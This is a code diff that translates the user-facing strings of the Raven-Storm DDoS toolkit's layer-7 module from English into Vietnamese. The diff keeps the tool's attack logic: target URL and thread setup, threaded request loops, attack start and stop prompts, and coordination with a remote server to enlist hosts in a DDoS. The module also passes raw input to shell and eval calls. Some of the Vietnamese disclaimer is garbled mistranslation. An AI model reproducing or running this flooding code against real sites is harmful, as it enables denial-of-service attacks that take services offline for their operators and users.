@@ -1,9 +1,9 @@
 # 2020
-# The Raven-Storm Toolkit was programmed and developed by Taguar258.
-# The Raven-Storm Toolkit is published under the MIT Licence.
-# The Raven-Storm Toolkit is based on the CLIF-Framework.
-# The CLIF-Framework is programmed and developed by Taguar258.
-# The CLIF-Framework is published under the MIT Licence.
+# Bộ công cụ Raven-Storm được lập trình và phát triển bởi Taguar258.
+# Bộ công cụ Raven-Storm được xuất bản theo Giấy phép MIT.
+# Bộ công cụ Raven-Storm dựa trên CLIF-Framework.
+# CLIF-Framework được lập trình và phát triển bởi Taguar258.
+# CLIF-Framework được xuất bản theo Giấy phép MIT.
 
 import urllib.request
 from os import getcwd, name, path, system
@@ -69,24 +69,24 @@ class Main:
 	def banner(self):
 		system("clear || cls")
 		print(("""C_B----------------------------------------------------------C_W
-THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
-THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
-TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
-BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
-FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
-EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
-DEFFINITIFLY POSSIBLE.
-RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
+NGƯỜI SÁNG TẠO KHÔNG CHỊU BẤT CỨ TRÁCH NHIỆM NÀO VỀ THIỆT HẠI GÂY RA.
+NGƯỜI DÙNG CŨNG PHẢI CHỊU TRÁCH NHIỆM
+ĐỂ PHÙ HỢP VỚI CÁC MỤC ĐÍCH BẤT HỢP PHÁP HOẶC THIỆT HẠI TAI NẠN DO BÃO RAVEN gây ra.
+BẰNG CÁCH SỬ DỤNG PHẦN MỀM NÀY, BẠN PHẢI ĐỒNG Ý CHỊU TRÁCH NHIỆM ĐẦY ĐỦ
+ĐỐI VỚI BẤT KỲ THIỆT HẠI NÀO DO RAVEN-STORM gây ra.
+MỌI Đòn tấn công SẼ gây ra THIỆT HẠI TẠM THỜI NHƯNG THIỆT HẠI DÀI HẠN LÀ
+CÓ KHẢ NĂNG ĐÚNG CÁCH.
+RAVEN-STORM KHÔNG NÊN ĐỀ XUẤT NHỮNG NGƯỜI THỰC HIỆN CÁC HOẠT ĐỘNG BẤT HỢP PHÁP.
 C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 		self.help()
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("Chúc một ngày tốt lành.")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("Nhập lệnh shell: ", ". ", command))
 		print("")
 
 	def check_session(self):
@@ -116,7 +116,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("Nhập lệnh gỡ lỗi: ", "$ ", command))
 		print("")
 
 	@event.command
@@ -131,13 +131,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def debug():
 		var.l7_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("Đã bật chế độ gỡ lỗi.")
 		print("")
 
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("Lệnh bạn đã nhập không tồn tại.")
 		print("")
 
 	@event.event
@@ -148,7 +148,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("Đã xảy ra lỗi khi gửi lệnh tới máy chủ.")
 				print("")
 
 	@event.event
@@ -177,15 +177,15 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		var.target = tools.arg("URLS (Seperated by ', '): ", "targets ", command).split(", ")
 		for url in var.target:
 			if "http" not in url:
-				print("%s is a invalid URL." % url)
+				print("%s là một URL không hợp lệ." % url)
 		print("")
 
 	@event.command
 	def target(command):
 		print("")
-		var.target = [tools.arg("URL (GET Parameters possible): ", "target ", command)]
+		var.target = [tools.arg("URL (Có thể nhận được tham số): ", "target ", command)]
 		if "http" not in var.target[0]:
-			print("This URL is invalid.")
+			print("URL này không hợp lệ.")
 		print("")
 
 	@event.command
@@ -194,25 +194,25 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		try:
 			var.threads = int(tools.arg("Threads: ", "threads ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def sleep(command):
 		print(" ")
 		try:
-			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
+			var.sleep = float(tools.arg("Độ trễ giữa mỗi chủ đề: ", "sleep ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
 	def interval(command):
 		print(" ")
 		try:
-			var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
+			var.interval = float(tools.arg("Độ trễ giữa mỗi gói: ", "interval ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("Đã xảy ra lỗi khi thực thi.", e)
 		print(" ")
 
 	@event.command
@@ -232,7 +232,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					var.command_log.append("ERROR: %s" % ex)
 					if var.l7_debug:
 						print("ERROR: %s" % ex)
-				print("Request received.")
+				print("Yêu cầu đã được nhận.")
 			sleep(var.interval)
 		var.stoped_threads += 1
 
@@ -240,7 +240,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def run():
 		def execute():
 			print("")
-			print("To stop the attack press: ENTER or CTRL + C")
+			print("Để dừng cuộc tấn công, nhấn: ENTER hoặc CTRL + C")
 			print("")
 
 			var.ps1 = ""  # Change due to threading bug.
@@ -252,10 +252,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					t.start()
 					sleep(var.sleep)
 				except Exception:
-					print("Could not start thread %s." % thread)
+					print("Không thể bắt đầu chuỗi %s." % thread)
 
 			def reset_attack():
-				print("Stopping threads...")
+				print("Đang dừng chuỗi...")
 				var.run_active = False
 				sleep(2)
 				while True:
@@ -265,7 +265,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						sleep(1)
 
 				if var.l7_debug:
-					print("Saving debugging log...")
+					print("Đang lưu nhật ký gỡ lỗi...")
 					output_to = path.join(getcwd(), "l7_debug_log.txt")
 
 					write_method = "a"
@@ -276,12 +276,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 					output_file = open(output_to, write_method)
 					if write_method == "a":
-						output_file.write("------------- New Log -------------")
+						output_file.write("------------- Nhật ký mới -------------")
 					output_file.write(str(name + "\n"))
 					output_file.write(str(version + "\n"))
 					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
-				print("Done.")
+				print("Xong.")
 				quit()
 
 			def check_stopped_execution():
@@ -303,7 +303,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			if var.server[0] and var.server[1]:
 				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 				if status != "200":
-					print("An error occured, while sending data to the server.")
+					print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 
 			reset_attack()
 
@@ -315,27 +315,27 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					break
 				else:
 					sleep(1)
-		elif not tools.question("\nDo you agree to the terms of use?"):
+		elif not tools.question("\nBạn có đồng ý với các điều khoản sử dụng không?"):
 			print("Agreement not accepted.")
 			quit()
 		else:
 			if var.server[0] and var.server[1]:
-				if tools.question("\nWould you like to use the host as part of the ddos?"):
+				if tools.question("\nBạn có muốn sử dụng máy chủ lưu trữ như một phần của ddos?"):
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 					execute()
 				else:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 					try:
-						print("[Press Enter to stop the attack.]")
+						print("[Nhấn Enter để dừng cuộc tấn công.]")
 					except KeyboardInterrupt:
 						pass
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
 			else:
 				execute()
 
